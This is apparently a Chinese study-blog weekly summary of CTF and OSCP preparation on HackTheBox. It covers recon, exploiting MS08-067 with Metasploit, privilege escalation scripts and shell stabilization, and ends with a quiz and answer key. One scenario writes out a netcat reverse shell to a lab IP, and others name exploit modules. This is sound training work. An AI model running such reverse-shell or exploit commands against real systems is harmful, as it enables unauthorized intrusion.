---
title: Week 10：第二阶段攻坚与打靶 - 周度总结
tags:
  - 学习总结
  - 阶段复盘
  - 实战打靶
categories:
  - 网络安全
date: 2026-03-31
---

# Week 10：第二阶段攻坚与打靶 (CTF & OSCP Prep) - 周度总结

## 📅 本周学习概览

本周是第二阶段（攻坚阶段）的收官之战。过去的一个月，我们从 SQL 注入到 XSS，从逻辑漏洞到系统提权，把 Web 和系统的核心漏洞过了一遍。

本周只有两天，但强度不减。我们的任务是：**Talk is cheap, show me the shell.** 我们离开舒适的靶场（如 DVWA, Pikachu），走向更接近真实的 HackTheBox 环境。这不仅是技术的检验，更是心态的磨练。你会发现，知道漏洞原理和在黑盒环境下找到它，完全是两码事。

<!--more-->

---

## 📚 每日核心知识回顾

### Day 059：实战打靶 - 信息收集与立足点 (Foothold)
- **打靶流程 (Kill Chain)**：
  1.  **侦察 (Recon)**：`nmap -sC -sV -oA recon <IP>`。
  2.  **枚举 (Enumeration)**：
      - Web: `gobuster`, `nikto`, `wappalyzer`。
      - SMB: `enum4linux`, `smbclient`。
  3.  **初次立足 (Initial Foothold)**：找到漏洞（如 RCE, Upload, Weak Creds），获取第一个 Shell。
- **实战案例 (HackTheBox - Legacy)**：
  - 发现端口：139, 445 (SMB)。
  - 识别版本：Windows XP。
  - 搜索漏洞：`searchsploit smb windows xp` -> MS08-067 (NetAPI)。
  - 利用：MSF `exploit/windows/smb/ms08_067_netapi` -> 直接获得 System 权限。

### Day 060：实战打靶 - 提权与 WriteUp 撰写
- **提权 (PrivEsc)**：
  - Linux: 上传 `LinPEAS.sh`，检查 SUID, Kernel, Cron, Sudo。
  - Windows: 上传 `WinPEAS.exe`，检查 Service, Registry, AlwaysInstallElevated。
- **稳定 Shell (Stabilization)**：
  - 简单的 nc shell 不支持自动补全和 Ctrl+C。
  - 升级技巧：`python3 -c 'import pty; pty.spawn("/bin/bash")'` -> `Ctrl+Z` -> `stty raw -echo; fg`。
- **WriteUp 撰写**：
  - 记录每一个发现、每一个命令、每一个失败的尝试。
  - 截图保存关键证据（Flag）。
  - 复盘：为什么在这里卡了 2 小时？有没有更快的路径？

---

## 📝 巩固练习题 (Level 10)

### 一、 概念速查（单选/简答）

1.  **在打靶时，Nmap 的参数 `-oA` 是什么意思？为什么建议总是加上它？**
    A) 扫描所有端口
    B) 开启操作系统检测
    C) 输出所有格式的结果（xml, nmap, gnmap）
    D) 攻击模式扫描
2.  **当你获得了一个反弹 Shell，发现无法使用 `su` 命令切换用户，提示 "Standard in must be a tty"，这是因为什么？**
3.  **Searchsploit 工具的数据源来自哪里？**
4.  **在 HackTheBox 中，Flag 通常存放在哪里？（User 和 Root）**
5.  **Reverse Shell (反向连接) 和 Bind Shell (正向连接) 的区别是什么？在防火墙限制入站流量的情况下，应该用哪种？**

### 二、 场景分析与安全实践（实战模拟）

6.  **场景：Web 枚举**
    你 Nmap 扫描发现目标开放了 80 端口，访问后只是一个 Apache 默认页面。
    *   接下来你会做什么？（列举至少 3 个工具或思路）
    *   如果 `gobuster` 扫描字典爆破没有结果，你还会尝试什么策略？（提示：子域名、扩展名）

7.  **场景：利用失败**
    你确认目标存在 CVE-2017-0143 (EternalBlue) 漏洞，但运行 MSF 的 exploit 模块失败了，提示 "Target is not vulnerable" 或连接超时。
    *   可能的原因有哪些？（列举 2 点）
    *   你会尝试手动利用脚本（Python）吗？为什么？

8.  **场景：稳定 Shell**
    你通过 WebShell 执行 `nc -e /bin/bash 10.10.14.2 4444` 弹回了一个 Shell。但是你一按 `Ctrl+C`，连接就断开了。
    *   请写出升级为 TTY 交互式 Shell 的标准 Python 命令。

### 三、 深度思考与综合分析

9.  **CTF/靶机环境与真实渗透测试（Real World）最大的区别是什么？在打靶中学到的哪些习惯可能在实战中是有害的？**

10. **如果你在打靶过程中完全卡住了（Stuck），没有任何思路，你会怎么做？（除了直接看 WriteUp）**

---

## 🔑 参考答案

### 一、 概念速查
1.  **C) 输出所有格式的结果**。便于后续保存证据，或通过 `grep` 处理数据，xml 格式还可导入 MSF。
2.  **这是一个非交互式 Shell (Non-interactive Shell)**，没有分配 TTY（伪终端）。
3.  **Exploit-DB**。
4.  **User Flag**: `C:\Users\<username>\Desktop\user.txt` 或 `/home/<username>/user.txt`。 **Root Flag**: `C:\Users\Administrator\Desktop\root.txt` 或 `/root/root.txt`。
5.  **反向**：靶机主动连攻击机。**正向**：攻击机主动连靶机。防火墙限制入站时，应使用**Reverse Shell (反向连接)**，因为出站流量通常较宽松。

### 二、 场景分析
6.  **Web 枚举**。
    *   `gobuster dir` 爆破目录。`nikto` 扫描漏洞。查看 `robots.txt`。检查页面源码注释。
    *   尝试指定扩展名 `-x php,txt,html,zip`。尝试子域名爆破 `gobuster vhost`。
7.  **利用失败**。
    *   原因：Target 架构/版本选错；XP/Win7 的利用 payload 不同；网络不稳定；已经被打崩了。
    *   会。MSF 的模块虽然方便，但有时 Payload 过大或特征明显。Github 上的原生 Python 脚本可能更轻量、更适配特定环境。
8.  **稳定 Shell**。
    *   `python -c 'import pty; pty.spawn("/bin/bash")'` (如果是 Python 2)。
    *   `python3 -c 'import pty; pty.spawn("/bin/bash")'` (如果是 Python 3)。

### 三、 深度思考
9.  **区别**。
    *   CTF 有解（Flag 一定存在），实战可能无解。
    *   CTF 随意破坏（重启、溢出），实战要求业务零中断。
    *   **有害习惯**：直接上高并发扫描（会打挂服务）；无脑运行来源不明的 binary（可能是后门）；只关注 Flag 不关注持久化和痕迹清理。
10. **脱困思路**。
    *   **重新枚举 (Re-enumerate)**：90% 的卡顿是因为信息收集不全。换个字典，换个端口，扫 UDP。
    *   **Google 每一个服务版本**：查看是否有已知漏洞。
    *   **检查代码/配置**：如果有 Web 源码，仔细审计。
    *   **休息**：切换思维。
